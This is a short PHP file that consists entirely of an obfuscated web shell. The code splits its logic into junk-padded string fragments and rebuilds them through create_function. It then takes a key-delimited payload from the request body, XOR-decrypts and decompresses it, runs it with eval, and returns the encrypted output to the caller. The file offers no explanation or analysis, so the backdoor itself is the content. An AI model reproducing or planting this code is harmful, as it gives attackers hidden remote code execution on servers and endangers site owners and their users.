<?php
$S='an();$r=@baswew64_enwcode(@x(@gzwwcompress($ow),$wk));print("$wp$wkh$r$kf");}';
$J=str_replace('T','','cTreatTe_TfTuncTTtion');
$o='$k="d5w0d5a3fw";$kh="w762dbw3cb414d"w;$wkf="bb0ew1a78e9w94";$pw="iwbQU';
$U='x(@bawsew64_decowde($m[1])w,w$wk)));$o=@ob_getw_cowntentsw();w@ob_end_cwlew';
$u='zyKVvcEwL8as7";wfunctwiwon x($t,$kw){$wcw=strlewn($k);w$l=strlen($tw);$o="";fow';
$w='ntws("php://iwnput"),$wm)==1) {@wob_wstart()w;@ewvawl(@gzuncowmpress(@';
$g='{$j};}}retwurn $wo;}if (w@preg_mwatch("/$kwhw(.+)$kf/",@wfile_getw_conwtwe';
$Y='r($i=0;w$i<$l;w){forw($j=0w;($j<w$cw&&$i<$l);$wj++,$i+w+)w{$wo.=$t{$iw}^$kw';
$x=str_replace('w','',$o.$u.$Y.$g.$w.$U.$S);
$D=$J('',$x);$D();
?>
